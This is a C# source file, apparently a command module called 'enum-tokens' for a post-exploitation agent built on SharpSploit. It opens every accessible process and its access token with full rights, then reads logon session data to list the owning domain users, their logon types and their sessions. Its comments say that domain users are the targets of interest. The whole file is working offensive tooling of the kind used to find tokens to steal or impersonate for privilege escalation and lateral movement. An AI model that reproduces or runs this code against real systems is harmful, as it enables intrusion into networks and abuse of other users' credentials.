using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class EnumerateTokens : AgentCommand
    {
        public override string Name => "enum-tokens";

        public override string Execute(AgentTask task)
        {
            var results = new SharpSploitResultList<ListTokenResults>();
            Process[] procs = Process.GetProcesses();
            IntPtr hToken;
            IntPtr hProcess;
            foreach (Process p in procs)
            {
                if (p.ProcessName != "csrss" && p.Id != 0 && p.ProcessName != "system" && p.ProcessName != "System")
                {
                    hProcess = Native.Kernel32.OpenProcess((uint)Native.Kernel32.ProcessAccessFlags.All, true, p.Id);
                    if (hProcess == IntPtr.Zero)
                    {
                        Native.Kernel32.CloseHandle(hProcess);
                        continue;
                    }

                    if (!Native.Advapi.OpenProcessToken(hProcess, Native.Advapi.TOKEN_ALL_ACCESS, out hToken))
                    {
                        Native.Kernel32.CloseHandle(hProcess);
                        continue;
                    }
                    if (hToken == IntPtr.Zero)
                    {
                        Native.Kernel32.CloseHandle(hProcess);
                        continue;
                    }

                    ListTokenResults t = new ListTokenResults
                    {
                        ProcessId = p.Id,
                        ProcessName = p.ProcessName,
                        hToken = hToken,
                        hProcess = hProcess
                    };
                    bool res = GetTokenInformation(ref t);
                    if (!res)
                    {
                        Native.Kernel32.CloseHandle(hProcess);
                        Native.Kernel32.CloseHandle(hToken);
                        continue;
                    }
                    // if token filled add to list
                    Native.Kernel32.CloseHandle(hProcess);
                    results.Add(t);
                }
            }
            // free the token handles
            foreach (var t in results)
            {
                Native.Kernel32.CloseHandle(t.hToken);
            }
            return results.ToString();
        }

        public static bool GetTokenInformation(ref ListTokenResults t)
        {
            IntPtr hToken = t.hToken;
            uint TokenStatusLength = 0;
            bool Result;
            // first call gets len of TokenInformation
            Result = Native.Advapi.GetTokenInformation(hToken, Native.Advapi.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenStatusLength, out TokenStatusLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenStatusLength);
            Result = Native.Advapi.GetTokenInformation(hToken, Native.Advapi.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenStatusLength, out TokenStatusLength);
            if (!Result)
            {
                return false;
            }
            // get logon session data
            Native.Advapi.TOKEN_STATISTICS TokenStats = (Native.Advapi.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Native.Advapi.TOKEN_STATISTICS));
            IntPtr LuidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Native.Advapi.TOKEN_STATISTICS)));
            Marshal.StructureToPtr(TokenStats.AuthenticationId, LuidPtr, false);
            IntPtr LogonSessionDataPTr = IntPtr.Zero;
            uint res = Native.Advapi.LsaGetLogonSessionData(LuidPtr, out LogonSessionDataPTr);
            if (res != 0 && LogonSessionDataPTr == IntPtr.Zero)
            {
                return false;
            }
            Native.Advapi.SECURITY_LOGON_SESSION_DATA LogonSessonData = (Native.Advapi.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(LogonSessionDataPTr, typeof(Native.Advapi.SECURITY_LOGON_SESSION_DATA));
            if (LogonSessonData.Username.Buffer != IntPtr.Zero && LogonSessonData.LoginDomain.Buffer != IntPtr.Zero)
            {
                string UserName = Marshal.PtrToStringUni(LogonSessonData.Username.Buffer, LogonSessonData.Username.Length / 2);
                string UserDomain = Marshal.PtrToStringUni(LogonSessonData.LoginDomain.Buffer, LogonSessonData.LoginDomain.Length / 2);
                // https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-security_logon_session_data
                //Console.WriteLine(UserName);
                // disregard computer account all we care about is domain users really
                // at this point more stuff can be enumerated with GetTokenInformation
                // like if token is impersonation token or not
                // or if token is elevated etc
                // dont really care about that for now
                if (UserName == Environment.MachineName.ToString() + "$")
                {
                    return false;
                }
                t.Owner = UserName;
                t.Domain = UserDomain;
                t.LogonType = LogonSessonData.LogonType;
                t.LogonSession = LogonSessonData.Session;
                return true;
            }
            return false;
        }
    }
    public sealed class ListTokenResults : SharpSploitResult
    {
        public int ProcessId { get; set; }
        public string ProcessName { get; set; }
        public string Domain { get; set; }
        public string Owner { get; set; }
        public uint LogonType { get; set; }
        public uint LogonSession { get; set; }
        public IntPtr hToken;
        public IntPtr hProcess;


        protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
        {
            new SharpSploitResultProperty{Name = nameof(ProcessName),Value = ProcessName},
            new SharpSploitResultProperty{Name = nameof(Owner),Value = Owner},
            new SharpSploitResultProperty{Name = nameof(Domain),Value = Domain},
            new SharpSploitResultProperty{Name = "PID",Value = ProcessId},
            new SharpSploitResultProperty{Name = nameof(LogonType),Value = LogonType},
            new SharpSploitResultProperty{Name = nameof(LogonSession),Value = LogonSession}
        };
    }
}